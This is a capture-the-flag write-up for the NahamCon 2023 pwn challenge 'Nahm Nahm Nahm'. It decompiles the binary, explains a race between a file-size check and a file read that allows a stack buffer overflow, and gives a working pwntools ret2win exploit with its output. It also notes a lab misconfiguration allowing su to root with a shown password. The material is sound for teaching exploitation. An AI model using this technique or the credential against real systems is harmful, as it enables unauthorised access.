# NahamCon 2023

## Nahm Nahm Nahm

> Me hungry for files!
>
>  Author: @WittsEnd
>
> [`nahmnahmnahm`](nahmnahmnahm)

Tags: _pwn_

## Solution
First thing is to check what the application is doing. Before running the application some rough understanding can be gathered by reversing the application with Ghidra.

```c
int main(int argc,char **argv)
{
  // ...
  printf("Enter file: ");
  fgets(filename,0x7f,stdin);
  lengthWithoutNewline = strcspn(filename,"\n");
  filename[lengthWithoutNewline] = '\0';
  hasFlagInName = strstr(filename,"flag");
  if (hasFlagInName == (char *)0x0) {
    fileState = lstat(filename,(stat *)&st);
    if (fileState == -1) {
      perror("stat");
    }
    else if ((st.st_mode & 0xf000) == 0xa000) {
      perror("is_symlink");
      fileState = -1;
    }
    else if (st.st_size < 0x51) {
      puts("Press enter to continue:");
      getchar();
      vuln(filename);
    }
    else {
      perror("File size");
      fileState = -1;
    }
  }
  else {
    perror("filename contains flag");
    fileState = -1;
  }
  return fileState;
}
```

First a filename is entered. Then there are some checks, the filename cannot have `flag` in it and the file cannot be a `symlink`. Therefore creating a symlink to the flag is not possible. The last condition is that the file cannot be larger than 81 bytes. If the file passed fullfils all the tests the user is prompted to hit enter and the flow continues in `vuln`.

```c
void vuln(char *filename)

{
  FILE *__stream;
  char buffer [80];
  FILE *f;
  
  __stream = fopen(filename,"r");
  if (__stream == (FILE *)0x0) {
    perror("fopen");
  }
  else {
    fread(buffer,1,0x1000,__stream);
    printf("%s",buffer);
  }
  return;
}
```

Ok, the name aside, this function is definitely vulnerable to buffer overflow. Max 4k worth of content is read into a 80 byte buffer. To avoid this the calling function checked the filesize. But there is a race-conditionish thing since the file size check and the actual reading of the file is delayed until the user hits enter. To a empty file can be passed, passing the check and afterwards can be filled with a payload. After the user hit enter the file is freshly opened and the payload is read causing a buffer overflow no matter of the size check before.

Another interesting function is `winning_function` which is not called anywhere but reads and prints the flag. So a typical `ret2win` scenario.

```c
void winning_function(void)
{
  FILE *__stream;
  char contents [256];
  FILE *f;
  
  puts("Welcome to the winning function!");
  __stream = fopen("flag","r");
  fread(contents,1,0x100,__stream);
  puts(contents);
  fclose(__stream);
  return;
}
```

With the analysis done the plan is to overflow the buffer and override the return address of `vuln` to point to `winning_function`. The following python script does exactly this.

```python
from pwn import *

binary = context.binary = ELF("/home/user/nahmnahmnahm", checksec=False)
p = process(binary.path)

# overflow buffer and override return address pointing to winning_function
payload = b"X"*104
payload += p64(binary.sym.winning_function)

# open/clear file
f = open("/tmp/foo", "wb")

# enter file with empty content to pass file size check
p.sendlineafter(b"Enter file:", b"/tmp/foo")

# wait until file is fully read and file size check was done
p.recvuntil(b"Press enter to continue:\n")
# write payload to file
f.write(payload)
f.close()

# press 'enter'
p.sendline(b"")

# read back and print flag
result = p.recv()
print(result[result.index(b"flag"):-2].decode("utf-8"))
```

```bash
user@:~$ python3 /tmp/solve.py
[+] Starting local process '/home/user/nahmnahmnahm': pid 41
flag{d41d8cd98f00b204e9800998ecf8427e}
[*] Stopped process '/home/user/nahmnahmnahm' (pid 41)
```

> **Note**
> 
> For this task where was a configuration issue allowing the user to su as root (password userpass) and just cat the flag

```bash
user@:~$ su -
Password:
root@nahm-nahm-nahm-8c5bb4eef8e8fa9e-79597b5cf-qwcpb:~# cd /home/user
root@nahm-nahm-nahm-8c5bb4eef8e8fa9e-79597b5cf-qwcpb:/home/user# cat flag
flag{d41d8cd98f00b204e9800998ecf8427e}
```

Flag `flag{d41d8cd98f00b204e9800998ecf8427e}`